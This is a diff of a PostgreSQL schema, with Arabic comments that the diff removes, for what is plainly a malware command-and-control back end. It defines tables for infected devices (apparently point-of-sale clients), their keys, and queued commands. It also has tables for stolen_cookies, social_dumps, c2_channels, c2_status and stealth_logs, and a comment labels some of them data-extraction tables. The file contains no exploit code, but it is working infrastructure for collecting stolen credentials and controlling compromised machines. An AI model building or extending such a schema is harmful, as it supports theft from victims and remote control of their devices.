@@ -1,7 +1,4 @@
 -- database/complete_schema.sql (نفذ في كل مشروع من المشاريع الأربعة)
--- ============================================================
--- 1. حذف الجداول القديمة (اختياري، لكننا نستخدم IF EXISTS)
--- ============================================================
 DROP TABLE IF EXISTS sessions CASCADE;
 DROP TABLE IF EXISTS banned_chats CASCADE;
 DROP TABLE IF EXISTS notification_logs CASCADE;
@@ -25,9 +22,6 @@ DROP TABLE IF EXISTS stealth_logs CASCADE;
 DROP TABLE IF EXISTS error_logs CASCADE;
 DROP TABLE IF EXISTS c2_status CASCADE;
 
--- ============================================================
--- 2. جداول الجلسات والحظر (لنظام الخمول والأمان)
--- ============================================================
 CREATE TABLE sessions (
     chat_id BIGINT PRIMARY KEY,
     last_activity TIMESTAMPTZ DEFAULT now(),
@@ -39,11 +33,6 @@ CREATE TABLE banned_chats (
     banned_at TIMESTAMPTZ DEFAULT now()
 );
 
--- ============================================================
--- 3. الهيكل الجديد بالكامل (متوافق مع جميع الميزات)
--- ============================================================
-
--- جدول الأجهزة المسجلة
 CREATE TABLE pos_clients (
     Entry_id BIGSERIAL PRIMARY KEY,
     Client_serial TEXT UNIQUE NOT NULL,
@@ -59,14 +48,12 @@ CREATE TABLE pos_clients (
     Device_config JSONB
 );
 
--- جدول المفاتيح
 CREATE TABLE device_keys (
     Device_id TEXT PRIMARY KEY REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
     Shared_key_enc TEXT NOT NULL,
     Expiry BIGINT NOT NULL
 );
 
--- جدول الأوامر (مشابه لـ service_tasks)
 CREATE TABLE service_requests (
     Ticket_id BIGSERIAL PRIMARY KEY,
     Target_client TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
@@ -78,7 +65,6 @@ CREATE TABLE service_requests (
     Last_updated TIMESTAMPTZ DEFAULT now()
 );
 
--- جداول استخراج البيانات
 CREATE TABLE stolen_cookies (
     Id BIGSERIAL PRIMARY KEY,
     Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
@@ -121,7 +107,6 @@ CREATE TABLE social_dumps (
     Dumped_at TIMESTAMPTZ DEFAULT now()
 );
 
--- جداول الذكاء الاصطناعي والعمليات
 CREATE TABLE ai_tasks (
     Task_id BIGSERIAL PRIMARY KEY,
     Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
@@ -141,7 +126,6 @@ CREATE TABLE ai_results (
     Created_at TIMESTAMPTZ DEFAULT now()
 );
 
--- جداول الاتصال والتخفي
 CREATE TABLE c2_channels (
     Channel_id BIGSERIAL PRIMARY KEY,
     Channel_type TEXT NOT NULL,
@@ -178,9 +162,6 @@ CREATE TABLE c2_status (
     Error_message TEXT
 );
 
--- ============================================================
--- 4. الفهارس لسرعة الأداء
--- ============================================================
 CREATE INDEX idx_pos_clients_serial ON pos_clients(client_serial);
 CREATE INDEX idx_requests_target ON service_requests(target_client);
 CREATE INDEX idx_cookies_device ON stolen_cookies(device_id);
@@ -194,9 +175,6 @@ CREATE INDEX idx_stealth_logs_device ON stealth_logs(device_id);
 CREATE INDEX idx_sessions_chat ON sessions(chat_id);
 CREATE INDEX idx_banned_chats ON banned_chats(chat_id);
 
--- ============================================================
--- 5. تفعيل RLS وسياسة service_role
--- ============================================================
 ALTER TABLE sessions ENABLE ROW LEVEL SECURITY;
 ALTER TABLE banned_chats ENABLE ROW LEVEL SECURITY;
 ALTER TABLE pos_clients ENABLE ROW LEVEL SECURITY;
